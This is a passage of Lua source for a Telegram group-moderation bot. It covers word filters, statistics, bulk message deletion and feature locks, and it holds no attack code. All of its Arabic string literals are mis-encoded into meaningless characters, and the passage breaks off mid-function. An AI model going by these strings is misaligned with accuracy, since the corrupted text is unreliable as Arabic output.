if text and text:match("^ุถุน ูุตู$") and ChCheck(msg) or text and text:match("^ูุถุน ูุตู$") and ChCheck(msg) then  
DevRio:set(Rinda..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงุฑุณู ูู ุงููุตู ุงูุงู', 1, 'md')
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text == "ููุน" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ูู ุงููููู ุงูุงู", 1, 'md') 
DevRio:set(Rinda.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevRio:get(Rinda.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'ุงูุบุงุก' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ุงูููุน', 1, 'md')
DevRio:del(Rinda.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ููุน ุงููููู โข "..text, 1, 'html')
DevRio:del(Rinda.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevRio:hset(Rinda..'Rio:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "ุงูุบุงุก ููุน" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ูู ุงููููู ุงูุงู", 1, 'md') 
DevRio:set(Rinda.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevRio:get(Rinda.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'ุงูุบุงุก' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ุงูุบุงุก ุงูููุน', 1, 'md')
DevRio:del(Rinda.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevRio:hget(Rinda..'Rio:Filters:'..msg.chat_id_, text) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงููููู โข "..text.." ุบูุฑ ููููุนู", 1, 'html')
DevRio:del(Rinda.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevRio:hdel(Rinda..'Rio:Filters:'..msg.chat_id_, text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงููููู โข "..text.." ุชู ุงูุบุงุก ููุนูุง", 1, 'html')
DevRio:del(Rinda.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
end
return false
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if SudoBot(msg) then
if text and text == "ุงูุงุญุตุงุฆูุงุช" and ChCheck(msg) or text and text == "โข  ุงูุงุญุตุงุฆูุงุช โ" and ChCheck(msg) then
local gps = DevRio:scard(Rinda.."Rio:Groups") local users = DevRio:scard(Rinda.."Rio:Users") 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงุญุตุงุฆูุงุช ุงูุจูุช โข โค\nโ๏ธฐุนุฏุฏ ุงููุดุชุฑููู โข โจ '..users..' โฉ\nโ๏ธฐุนุฏุฏ ุงููุฌููุนุงุช โข โจ '..gps..' โฉ', 1, 'md')
end
if text and text == "ุงููุดุชุฑููู" and ChCheck(msg) or text and text == "โข ุงููุดุชุฑููู โ" and ChCheck(msg) then
local users = DevRio:scard(Rinda.."Rio:Users")
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุนุฏุฏ ุงููุดุชุฑููู โข โจ '..users..' โฉ', 1, 'md')
end
if text and text == "ุงููุฌููุนุงุช" and ChCheck(msg) or text and text == "โข ุงููุฌููุนุงุช โ" and ChCheck(msg) then
local gps = DevRio:scard(Rinda.."Rio:Groups")
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุนุฏุฏ ุงููุฌููุนุงุช โข โจ '..gps..' โฉ', 1, 'md')
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text == "ุงููุฌููุนุงุช" and ChCheck(msg) or text and text == "โข ุงููุฌููุนุงุช โ" and ChCheck(msg) then
if not SudoBot(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุทูุฑูู ููุท ', 1, 'md')
else
local list = DevRio:smembers(Rinda.."Rio:Groups")
local t = 'โ๏ธฐูุฌููุนุงุช ุงูุจูุช โขโฏ\n'
for k,v in pairs(list) do
t = t..k.."~ : `"..v.."`\n" 
end
if #list == 0 then
t = 'โ๏ธฐูุง ููุฌุฏ ูุฌููุนุงุช ููุนูู'
end
Dev_Rio(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match('^ุชูุธูู (%d+)$') or text and text:match('^ูุณุญ (%d+)$') and ChCheck(msg) then  
if not DevRio:get(Rinda..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
local Number = tonumber(text:match('^ุชูุธูู (%d+)$') or text:match('^ูุณุญ (%d+)$')) 
if Number > 5000 then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุงุชุณุชุทูุน ุชูุธูู ุงูุซุฑ ูู 5000 ุฑุณุงูู', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุชูุธูู *'..Number..'* ูู ุงูุฑุณุงุฆู', 1, 'md')
DevRio:setex(Rinda..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
if text == "ุชูุธูู ุงููุดุชุฑููู" and SecondSudo(msg) and ChCheck(msg) or text == "โข ุชูุธูู ุงููุดุชุฑููู โ" and SecondSudo(msg) and ChCheck(msg) then 
local pv = DevRio:smembers(Rinda.."Rio:Users")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok" then
else
DevRio:srem(Rinda.."Rio:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ูุง ููุฌุฏ ูุดุชุฑููู ูููููู*', 1, 'md')
else
local ok = #pv - sendok
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุนุฏุฏ ุงููุดุชุฑููู ุงูุงู โข { '..#pv..' }\nโ๏ธฐุชู ุญุฐู โข { '..sendok..' } ูู ุงููุดุชุฑููู\nโ๏ธฐุงูุนุฏุฏ ุงูุญูููู ุงูุงู  โข ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
--     ??๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุธูู ุงููุฑูุจุงุช" and SecondSudo(msg) and ChCheck(msg) or text == "ุชูุธูู ุงููุฌููุนุงุช" and SecondSudo(msg) and ChCheck(msg) or text == "โข ุชูุธูู ุงููุฌููุนุงุช โ" and SecondSudo(msg) and ChCheck(msg) then 
local group = DevRio:smembers(Rinda.."Rio:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevRio:srem(Rinda.."Rio:Groups",group[i]) 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = Rinda, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevRio:srem(Rinda.."Rio:Groups",group[i]) 
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevRio:srem(Rinda.."Rio:Groups",group[i]) 
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
DevRio:srem(Rinda.."Rio:Groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐ*ูุงุชูุฌุฏ ูุฌููุนุงุช ููููู*', 1, 'md')   
else
local Rindagp2 = (w + q)
local Rindagp3 = #group - Rindagp2
if q == 0 then
Rindagp2 = ''
else
Rindagp2 = '\nโ๏ธฐุชู ุญุฐู โข { '..q..' } ูุฌููุนู ูู ุงูุจูุช'
end
if w == 0 then
Rindagp1 = ''
else
Rindagp1 = '\nโ๏ธฐุชู ุญุฐู โข { '..w..' } ูุฌููุนู ุจุณุจุจ ุชูุฒูู ุงูุจูุช ุงูู ุนุถู'
end
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุนุฏุฏ ุงููุฑูุจุงุช ุงูุงู โข { '..#group..' }'..Rindagp1..Rindagp2..'\nโ๏ธฐุงูุนุฏุฏ ุงูุญูููู ุงูุงู  โข ( '..Rindagp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
end 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and (text == "ุชูุนูู ุงูุชููุงุฆู" or text == "ุชูุนูู ุงููุณุญ ุงูุชููุงุฆู" or text == "ุชูุนูู ุงูุญุฐู ุงูุชููุงุฆู") and Constructor(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ููุฒุฉ ุงูุญุฐู ุงูุชููุงุฆู ููููุฏูุง'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Lock:CleanNum'..msg.chat_id_,true)  
end
if text and (text == "ุชุนุทูู ุงูุชููุงุฆู" or text == "ุชุนุทูู ุงููุณุญ ุงูุชููุงุฆู" or text == "ุชุนุทูู ุงูุญุฐู ุงูุชููุงุฆู") and Constructor(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุญุฐู ุงูุชููุงุฆู ููููุฏูุง'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Lock:CleanNum'..msg.chat_id_) 
end
if text and (text:match("^ุชุนูู ุนุฏุฏ ุงููุณุญ (%d+)$") or text:match("^ุชุนููู ุนุฏุฏ ุงููุณุญ (%d+)$") or text:match("^ุชุนูู ุนุฏุฏ ุงูุญุฐู (%d+)$") or text:match("^ุชุนููู ุนุฏุฏ ุงูุญุฐู (%d+)$") or text:match("^ุนุฏุฏ ุงููุณุญ (%d+)$")) and Constructor(msg) and ChCheck(msg) then
local Num = text:match("ุชุนูู ุนุฏุฏ ุงููุณุญ (%d+)$") or text:match("ุชุนููู ุนุฏุฏ ุงููุณุญ (%d+)$") or text:match("ุชุนูู ุนุฏุฏ ุงูุญุฐู (%d+)$") or text:match("ุชุนููู ุนุฏุฏ ุงูุญุฐู (%d+)$") or text:match("ุนุฏุฏ ุงููุณุญ (%d+)$")
if tonumber(Num) < 10 or tonumber(Num) > 1000 then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ุจุชุญุฏูุฏ ุนุฏุฏ ุงูุจุฑ ูู 10 ูุงุตุบุฑ ูู 1000 ููุญุฐู ุงูุชููุงุฆู', 1, 'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ูุถุน โข *'..Num..'* ูู ุงูููุฏูุง ููุญุฐู ุงูุชููุงุฆู', 1, 'md')
DevRio:set(Rinda..'Rio:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevRio:get(Rinda..'Rio:Lock:CleanNum'..msg.chat_id_) then
if DevRio:get(Rinda..'Rio:CleanNum'..msg.chat_id_) then CleanNum = DevRio:get(Rinda..'Rio:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevRio:scard(Rinda.."Rio:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevRio:smembers(Rinda.."Rio:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
SendText(msg.chat_id_,"โ๏ธฐุชู ุญุฐู "..Del.." ูู ุงูููุฏูุง ุชููุงุฆูุง",0,'md') 
DevRio:del(Rinda.."Rio:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if DevRio:get(Rinda..'Rio:Lock:CleanNum'..msg.chat_id_) then 
if text == "ุงูุชููุงุฆู" and ChCheck(msg) or text == "ุนุฏุฏ ุงูุชููุงุฆู" and ChCheck(msg) then 
local M = DevRio:scard(Rinda.."Rio:cleanernum"..msg.chat_id_)
if M ~= 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุนุฏุฏ ุงูููุฏูุง โข "..M.."\nโ๏ธฐุงูุญุฐู ุงูุชููุงุฆู โข "..(DevRio:get(Rinda..'Rio:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุงุชูุฌุฏ ููุฏูุง ููุง", 1, 'md') 
end end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ุงูุณุญ" and Constructor(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุณุญ ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Lock:Clean'..msg.chat_id_,true)  
end
if text == "ุชุนุทูู ุงูุณุญ" and Constructor(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุณุญ ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if DevRio:get(Rinda..'Rio:Lock:Clean'..msg.chat_id_) then 
if text == "ุงูููุฏูุง" and ChCheck(msg) or text == "ุนุฏุฏ ุงูููุฏูุง" and ChCheck(msg) then 
local M = DevRio:scard(Rinda.."Rio:cleaner"..msg.chat_id_)
if M ~= 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุนุฏุฏ ุงูููุฏูุง โข "..M, 1, 'md') 
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุงุชูุฌุฏ ููุฏูุง ููุง", 1, 'md') 
end end
if text == "ุงุญุฐู" and ChCheck(msg) or text == "ุชูุธูู ููุฏูุง" and ChCheck(msg) or text == "ุชูุธูู ุงูููุฏูุง" and ChCheck(msg) then
local List = DevRio:smembers(Rinda.."Rio:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญุฐู "..Del.." ูู ุงูููุฏูุง", 1, 'md') 
DevRio:del(Rinda.."Rio:cleaner"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุงุชูุฌุฏ ููุฏูุง ููุง", 1, 'md') 
end end 
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ูุณุญ ุงูุงุบุงูู" and Constructor(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ูุณุญ ุงูุงุบุงูู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "ุชุนุทูู ูุณุญ ุงูุงุบุงูู" and Constructor(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ูุณุญ ุงูุงุบุงูู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if DevRio:get(Rinda..'Rio:Lock:CleanMusic'..msg.chat_id_) then 
if text == "ุงูุงุบุงูู" and ChCheck(msg) or text == "ุนุฏุฏ ุงูุงุบุงูู" and ChCheck(msg) then 
local M = DevRio:scard(Rinda.."Rio:cleanermusic"..msg.chat_id_)
if M ~= 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุนุฏุฏ ุงูุงุบุงูู โข "..M, 1, 'md') 
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุงุชูุฌุฏ ุงุบุงูู ููุง", 1, 'md') 
end end
if text == "ูุณุญ ุงูุงุบุงูู" or text == "ุชูุธูู ุงูุงุบุงูู" or text == "ุญุฐู ุงูุงุบุงูู" then
local List = DevRio:smembers(Rinda.."Rio:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญุฐู "..Del.." ูู ุงูุงุบุงูู", 1, 'md') 
DevRio:del(Rinda.."Rio:cleanermusic"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุงุชูุฌุฏ ุงุบุงูู ููุง", 1, 'md') 
end end end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Admin(msg) then
if text == "ุชูุธูู ุชุนุฏูู" and ChCheck(msg) or text == "ุชูุธูู ุงูุชุนุฏูู" and ChCheck(msg) then   
Rio_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
Rio_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Rio_Del},function(arg,data)
new = 0
Rio_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
Rio_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,Rio_Del2)
end,nil)  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุชูุธูู 100 ูู ุงูุฑุณุงุฆู ุงููุนุฏูู', 1, 'md')
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^ูุชุญ (.*)$") and ChCheck(msg) then
local UnLockText = {string.match(text, "^(ูุชุญ) (.*)$")}
if UnLockText[2] == "ุงูุชุนุฏูู" then
if DevRio:get(Rinda..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุชุนุฏูู")  
DevRio:del(Rinda..'Rio:Lock:EditMsgs'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุชุนุฏูู ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end
end
if RioConstructor(msg) then
if UnLockText[2] == "ุงูุชุนุฏูู ุงูููุฏูุง" or UnLockText[2] == "ุชุนุฏูู ุงูููุฏูุง" then
if DevRio:get(Rinda..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุชุนุฏูู ุงูููุฏูุง")  
DevRio:del(Rinda..'Rio:Lock:EditMsgs'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชุนุฏูู ุงูููุฏูุง ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end
end
end
if UnLockText[2] == "ุงููุงุฑุณูู" then
if DevRio:get(Rinda..'Rio:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงููุงุฑุณูู")  
DevRio:del(Rinda..'Rio:Lock:Farsi'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุงุฑุณูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููุดุงุฑ" then
if not DevRio:get(Rinda..'Rio:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงููุดุงุฑ")  
DevRio:set(Rinda..'Rio:Lock:Fshar'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุดุงุฑ ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุทุงุฆููู" then
if not DevRio:get(Rinda..'Rio:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุทุงุฆููู")  
DevRio:set(Rinda..'Rio:Lock:Taf'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุทุงุฆููู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูููุฑ" then
if not DevRio:get(Rinda..'Rio:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูููุฑ")  
DevRio:set(Rinda..'Rio:Lock:Kfr'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูููุฑ ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููุงุฑุณูู ุจุงูุทุฑุฏ" then
if DevRio:get(Rinda..'Rio:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงููุงุฑุณูู ุจุงูุทุฑุฏ")  
DevRio:del(Rinda..'Rio:Lock:FarsiBan'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุงุฑุณูู ุจุงูุทุฑุฏ ุจุงููุนู ููุชูุญู', 1, 'md')
end
end
if RioConstructor(msg) then
if UnLockText[2] == "ุงูุจูุชุงุช" or UnLockText[2] == "ุงูุจูุชุงุช ุจุงูุทุฑุฏ" or UnLockText[2] == "ุงูุจูุชุงุช ุจุงูุชูููุฏ" or UnLockText[2] == "ุงูุจูุชุงุช ุจุงูุชููุฏ" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุจูุชุงุช")  
DevRio:del(Rinda.."Rio:Lock:Bots"..msg.chat_id_)  
end end
if UnLockText[2] == "ุงูุชูุฑุงุฑ" then 
DevRio:hdel(Rinda.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุชูุฑุงุฑ")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "ุงูุชุซุจูุช" then
if DevRio:get(Rinda..'Rio:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุชุซุจูุช")  
DevRio:del(Rinda..'Rio:Lock:Pin'..msg.chat_id_)
DevRio:srem(Rinda.."Rio:Lock:Pinpin",msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุชุซุจูุช ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end end end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Admin(msg) then
if text and text:match("^ููู (.*)$") and ChCheck(msg) then
local LockText = {string.match(text, "^(ููู) (.*)$")}
if LockText[2] == "ุงูุฏุฑุฏุดู" then
if not DevRio:get(Rinda..'Rio:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุฏุฑุฏุดู")  
DevRio:set(Rinda..'Rio:Lock:Text'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุฏุฑุฏุดู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุงูููุงูู" then
if not DevRio:get(Rinda..'Rio:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุงูููุงูู")  
DevRio:set(Rinda..'Rio:Lock:Inline'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุงูููุงูู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุตูุฑ" then
if not DevRio:get(Rinda..'Rio:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุตูุฑ")  
DevRio:set(Rinda..'Rio:Lock:Photo'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุตูุฑ ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูููุงูุด" then
if not DevRio:get(Rinda..'Rio:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูููุงูุด")  
DevRio:set(Rinda..'Rio:Lock:Spam'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูููุงูุด ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุฏุฎูู" then
if not DevRio:get(Rinda..'Rio:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุฏุฎูู")  
DevRio:set(Rinda..'Rio:Lock:Join'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุฏุฎูู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูููุฏูู" then
if not DevRio:get(Rinda..'Rio:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูููุฏูู")  
DevRio:set(Rinda..'Rio:Lock:Videos'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูููุฏูู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููุชุญุฑูู" then
if not DevRio:get(Rinda..'Rio:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงููุชุญุฑูู")  
DevRio:set(Rinda..'Rio:Lock:Gifs'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุชุญุฑูู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุงุบุงูู" then
if not DevRio:get(Rinda..'Rio:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุงุบุงูู")  
DevRio:set(Rinda..'Rio:Lock:Music'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุงุบุงูู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุตูุช" then
if not DevRio:get(Rinda..'Rio:Lock:Voice'..msg.chat_id_) then
